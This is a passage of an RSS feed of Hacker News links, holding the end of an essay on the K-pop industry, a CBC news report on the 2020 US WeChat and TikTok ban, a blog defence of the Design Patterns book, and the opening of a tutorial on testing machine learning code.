<li>K-pop stars are forced to abide by extremely restrictive behavioral norms to appease production companies and fans</li>
</ul>
<h3><a href="#Process"><strong><u>Part 4</u>– <u>The Process</u></strong></a></h3>
<ul>
<li>Trying to become a K-pop star is a terrible idea by any rational cost-benefit analysis</li>
<li>The process by which production companies train K-pop stars is abusive and depends on the ignorance of children/teenagers and clueless and/or malicious parents</li>
<li>Even after making it through the extraordinarily difficult audition and training process, the vast majority of K-pop stars will have short careers and earn little or possibly <em>no</em> money</li>
</ul>
<h3><a href="#Machine"><strong><u>Part 5</u> – <u>The Machine</u></strong></a></h3>
<ul>
<li>K-pop is an extremely centralized, hierarchical industry, where structural, business, and creative decisions are almost entirely made by corporate management, rather than the performers</li>
<li>Raw creativity in the music production process is largely outsourced to Westerners who write, produce, and choreograph the music</li>
<li>The K-pop industry is subsidized and supported by the South Korean government, if not implicitly or explicitly directed, as a conscious form of soft power projection and social control.</li>
</ul>
<p>As you can tell, I came away from my research with a negative view of K-pop. I don’t think it’s the worst thing in the world, but I find its fandom to be unhealthy and its production process to be exploitative. That being said, there are undoubtedly many tremendous talents in the K-pop world and the cultural power of K-pop is remarkable. I’ll give my summarized thoughts on K-pop as a whole at the conclusion of the essay.<br>
<a name="Basics"></a></p>
<hr>
<p><img src="https://www.rollingstone.com/wp-content/uploads/2018/08/BTS-kpop-takeover-the-world.jpg" alt="How K-Pop Conquered the West - Rolling Stone"></p>
<h2><strong><u>Part 1</u> – <u>The Basics</u></strong></h2>
<h3><strong>What is K-pop?</strong></h3>
<p>“K-pop” refers to a genre of music and the industry which creates it. Both are based out of South Korea and particularly Seoul.</p>
<h3><strong>What is K-pop music?</strong></h3>
<p>K-pop is an offshoot of 90s Western pop with heavy influences from synthetics and hip hop. Lyrics are mostly Korean, but with English words and sometimes other languages thrown in. K-pop is usually sung by mono-gendered bands with members aged from their mid-teens to late 20s. Such bands typically resemble the structure and appearance of American boy bands from the 90s and 2000s (ie. NSYNC). As a representative K-pop sample, check out “DNA” by BTS:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/MBdVXkSdhwU?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Properly understood, “K-pop music” is inseparable from “K-pop performance.” The music itself is one component of a larger presentation which includes dance choreography, music videos, fashion, and the personas of bands and individual band members. Though these elements are also present in Western music, they are far more important to K-pop music. K-pop fandom is considered the appreciation of all these aspects as an integrated whole.</p>
<h3><strong>What are the Origins of K-pop?</strong></h3>
<p>The Western influence on Korean music began in the 1940s with the American occupation of much of the Korean peninsula after its liberation from Imperial Japan. With the outbreak of the Korean War in the early 1950s, further American presence was added, with over 300,000 US troops at the peak.<a href="#_edn1" name="_ednref1">[1]</a> After the war, the American military stayed at dozens<a href="#_edn2" name="_ednref2">[2]</a> of bases throughout South Korea as a permanent fixture of the country. Over the decades, these soldiers imported American culture and media, including American music. Presently, there are still 20,000 US soldiers in South Korea.<a href="#_edn3" name="_ednref3">[3]</a></p>
<p>The early Western musical influence in South Korea was based on folk and hippie music in the 60s and 70s, and then evolved into sappy ballads in the 80s. These genres merged with traditional Korean music to form a small, localized music industry. Creative expansion was restrained by the South Korean government’s censorship and restrictions on movement in and out of the country. In the 1970s, the government banned American rock music and Korean offshoots for their connotations with drug use.<a href="#_edn4" name="_ednref4">[4]</a> Until 1983, South Korean citizens were banned from traveling abroad for tourism, and the last restrictions weren’t lifted until 1988 (year of the Seoul Summer Olympics).<a href="#_edn5" name="_ednref5">[5]</a></p>
<p>Korean music had a revolution in the early 1990s with the three-member band, Seo Taiji and the Boys. Founded in 1992, the Boys debuted on a South Korean television talent show and received the lowest ratings of the night.<a href="#_edn6" name="_ednref6">[6]</a> Unexpectedly, their premiere song was a huge hit and launched the band to fame. The Boys soon became the first successful Korean rap group and redefined the Korean music industry. Leader Seo Taiji was a rare experimenter in a country still emerging from isolation and relative cultural stagnancy. Prior to forming the Boys, he had been part of an indie heavy metal band.<a href="#_edn7" name="_ednref7">[7]</a></p>
<p>Through their music, style, and appearance, Seo Taiji and the Boys inadvertently became the first K-Pop band. While their music was more hip hop-based, the Boys pioneered the mixture of Western pop and hip hop presented with intense, highly-choreographed dance routines within a refined aesthetic theme.<a href="#_edn8" name="_ednref8">[8]</a> For a sample, see here:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/IRFfPZQeJuo?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Seo Taiji and the Boys disbanded in 1996. But by the end of its short career, mimicking boy bands had sprung up throughout South Korea. These bands were picked up by a new wave of music production companies which would become the basis of the K-pop industry. They looked to Japan and its well established “J-pop” industry as a template for the sustained production of popular musical talent. Thus, while the Boys were independent, experimental, and subversive, the bands created in their wake were more institutionalized, sanitized, and formed by top-down design.</p>
<h3><strong>How Big is K-pop?</strong></h3>
<p>In 2017, the entire K-pop industry produced $5 billion in revenue.<a href="#_edn9" name="_ednref9">[9]</a> For the closest American comparison I can find – in 2019, American <em>record labels</em> earned $8.7 billion in revenue.<a href="#_edn10" name="_ednref10">[10]</a> Unfortunately, I can’t find numbers for total music industry revenue in the US, so this isn’t quite a fair comparison. The two might be difficult to compare due to diverging industry structures;&nbsp; for instance, in South Korea, $1.2 billion of its 2017 revenues came from karaoke sales, only $250 million less than its digital music sales<a href="#_edn11" name="_ednref11">[11]</a></p>
<p>Nevertheless, considering that South Korea has less than 1/6<sup>th</sup> the US population and 1/14<sup>th</sup> the GDP, that’s pretty damn impressive.</p>
<p>Also of note, in 2019, South Korea was the 6<sup>th</sup> largest music market in the world, ahead of China and behind France.<a href="#_edn12" name="_ednref12">[12]</a> In 2017, South Korea exported $513 million worth of music and imported only $14 million worth, which is an extremely strong indicator of the country’s preference for K-pop over Western pop.<a href="#_edn13" name="_ednref13">[13]</a></p>
<p>BTS (AKA Bangtan Boys) is the most popular K-pop band in the world today and ever. According to the 2019 IFPI Global Music Report, BTS was the 7<sup>th</sup> most listened to artist in the world, and had the 3<sup>rd</sup> most popular album globally. Despite Spotify not streaming in South Korea, BTS was its second most popular artist in 2019.<a href="#_edn14" name="_ednref14">[14]</a></p>
<p>Perhaps more relevantly, a 2017 Hyundai Research Institute report claimed that BTS alone was worth $3.6 billion to the South Korean economy annually when accounting for adjacent economic activity and tourism. Supposedly 1/13th of all tourists to South Korea in 2017 came because of BTS.<a href="#_edn15" name="_ednref15">[15]</a> A 2019 report from Hollywood Reporter brought the figure up $4.65 billion.<a href="#_edn16" name="_ednref16">[16]</a></p>
<h3><strong>How Big is K-pop in America?</strong></h3>
<p>I can’t find firm figures, but the general consensus is that K-pop has been blowing up in the US since at least 2017, with articles about the genre’s American explosion popping up in the <em>New York Times</em>,<a href="#_edn17" name="_ednref17">[17]</a> <em>NPR</em>,<a href="#_edn18" name="_ednref18">[18]</a> the <em>Guardian</em>,<a href="#_edn19" name="_ednref19"><em><strong>[19]</strong></em></a> etc. From 2015 to 2019, demand for K-pop concert tickets increased 1,900% in the US.<a href="#_edn20" name="_ednref20">[20]</a> This growth seems to be largely thanks to BTS, which is about 5X more popular than Blackpink, the second most popular …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</a></em></p>]]>
            </description>
            <link>https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525108</guid>
            <pubDate>Sat, 19 Sep 2020 04:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 166 | Comments 151 (<a href="https://news.ycombinator.com/item?id=24524662">thread link</a>) | @empressplay
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524662</guid>
            <pubDate>Sat, 19 Sep 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24524046">thread link</a>) | @pietromenna
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524046</guid>
            <pubDate>Sat, 19 Sep 2020 01:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test Machine Learning Code and Systems]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24523930">thread link</a>) | @7d7n
<br/>
September 18, 2020 | https://eugeneyan.com/writing/testing-ml/ | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/testing-ml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Two weeks ago, <a href="https://twitter.com/jeremyjordan" target="_blank">Jeremy</a> wrote a great post on <a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">Effective Testing for Machine Learning Systems</a>. He distinguished between traditional software tests and machine learning (ML) tests; software tests check the <strong>written logic</strong> while ML tests check the <strong>learned logic</strong>.</p>

<p>ML tests can be further split into <strong>testing</strong> and <strong>evaluation</strong>. We’re familiar with ML <strong>evaluation</strong> where we train a model and evaluate its performance on an unseen validation set; this is done via metrics (e.g., accuracy, <a href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic#Area_under_the_curve" target="_blank">Area under Curve of Receiver Operating Characteristic (AUC ROC)</a>) and visuals (e.g., <a href="https://eugeneyan.com/writing/recommender-systems-baseline-pytorch/#implementation-2-matrix-factorization-with-bias" target="_blank">precision-recall curve</a>).</p>

<p>On the other hand, ML <strong>testing</strong> involves checks on model behaviour. <strong>Pre-train tests</strong>—which can be run without trained parameters—check if our <em>written logic</em> is correct. For example, is classification probability between 0 to 1? <strong>Post-train tests</strong> check if the <em>learned logic</em> is expected. For example, on the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>, we should expect females to have a higher survival probability (relative to males).</p>

<p><img src="https://eugeneyan.com/assets/testing-ml-flow.jpg" title="Workflow for testing machine learning" alt="Workflow for testing machine learning"></p>
<p>Workflow for testing machine learning (<a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">source</a>)</p>

<p>Taken together, here’s how the workflow might look like. To complement this, we’ll implement a machine learning model and run the following tests on it:</p>
<ul>
  <li><a href="#pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</a></li>
  <li><a href="#post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</a></li>
  <li><a href="#model-evaluation-to-ensure-satisfactory-performance">Evaluation to ensure satisfactory model performance</a></li>
</ul>

<blockquote>
  <p>Follow along with the code in this Github repository: <a href="https://github.com/eugeneyan/testing-ml" target="_blank"><code>testing-ml</code></a></p>
</blockquote>

<h2 id="setting-up-the-context-algorithm-and-data">Setting up the context (algorithm and data)</h2>

<p>Before we can do ML testing, we’ll need an <strong>algorithm and some data</strong>. Our algorithm will be a <a href="https://numpy.org/" target="_blank"><code>numpy</code></a> implementation of <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py" target="_blank"><code>DecisionTree</code></a> which predicts a probability for binary classification. (<a href="#try-it-for-yourself-and-break-something">Extensions to make it support regression welcome!</a>).</p>

<p>To run our tests, we’ll use the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>. This tiny data set (~900 rows, 10 features) makes for fast testing (when model training is involved) and allows us to iterate quickly. (As part of performance evaluation, we run <code>fit()</code> and <code>predict()</code> hundreds of times to get the 99th percentile timing.) The simplicity and familiarity of the data also makes it easier to discuss the post-train (i.e., learned logic) tests.</p>

<div><div><pre><code>+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
| PassengerId | Survived | Pclass | Name                                    | Sex    | Age | SibSp | Parch | Ticket    |    Fare | Cabin | Embarked |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------|
|           1 |        0 |      3 | Braund, Mr. Owen Harris                 | male   |  22 |     1 |     0 | A/5 21171 |    7.25 | nan   | S        |
|           2 |        1 |      1 | Cumings, Mrs. John Bradley (Florence... | female |  38 |     1 |     0 | PC 17599  | 71.2833 | C85   | C        |
|           3 |        1 |      3 | Heikkinen, Miss. Laina                  | female |  26 |     0 |     0 | STON/O2.  |   7.925 | nan   | S        |
|           4 |        1 |      1 | Futrelle, Mrs. Jacques Heath (Lily M... | female |  35 |     1 |     0 | 113803    |    53.1 | C123  | S        |
|           5 |        0 |      3 | Allen, Mr. William Henry                | male   |  35 |     0 |     0 | 373450    |    8.05 | nan   | S        |
|           6 |        0 |      3 | Moran, Mr. James                        | male   | nan |     0 |     0 | 330877    |  8.4583 | nan   | Q        |
|           7 |        0 |      1 | McCarthy, Mr. Timothy J                 | male   |  54 |     0 |     0 | 17463     | 51.8625 | E46   | S        |
|           8 |        0 |      3 | Palsson, Master. Gosta Leonard          | male   |   2 |     3 |     1 | 349909    |  21.075 | nan   | S        |
|           9 |        1 |      3 | Johnson, Mrs. Oscar W (Elisabeth Vil... | female |  27 |     0 |     2 | 347742    | 11.1333 | nan   | S        |
|          10 |        1 |      2 | Nasser, Mrs. Nicholas (Adele Achem)     | female |  14 |     1 |     0 | 237736    | 30.0708 | nan   | C        |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
</code></pre></div></div>
<p>If you're unfamiliar with the Titanic dataset, here's how it looks like (scroll to the right).</p>

<h2 id="adopting-testing-habits-from-software-engineering">Adopting testing habits from software engineering</h2>

<p>We’ll adopt some good habits from software engineering. We won’t go through them in detail here though it was previously covered in another <a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/" target="_blank">post</a>:</p>
<ul>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#write-some-unit-tests-theyre-our-safety-harness" target="_blank">Unit test</a> fixture reuse, exceptions testing, etc with <a href="https://docs.pytest.org/en/latest/" target="_blank"><code>pytest</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-coverage-how-extensive-are-our-tests" target="_blank">Code coverage</a> with <a href="https://coverage.readthedocs.io/en/coverage-5.2.1/" target="_blank"><code>Coverage.py</code></a> and <a href="https://pytest-cov.readthedocs.io/en/latest/" target="_blank"><code>pytest-cov</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#lint-to-ensure-consistency-across-projects" target="_blank">Linting</a> to ensure code consistency with <a href="https://www.pylint.org/" target="_blank"><code>pylint</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-type-errors-to-prevent-them" target="_blank">Type checking</a> to verify type correctness with <a href="http://mypy-lang.org/" target="_blank"><code>mypy</code></a></li>
</ul>

<p>(Note: The tests below won’t include type hints though the <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py#L16" target="_blank">implementation code</a> does.)</p>

<h2 id="pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</h2>

<p>In pre-train tests, we want to <strong>catch errors in our implementation</strong> (i.e., written logic) before training an erroneous model. We can run these tests without a fully trained model.</p>

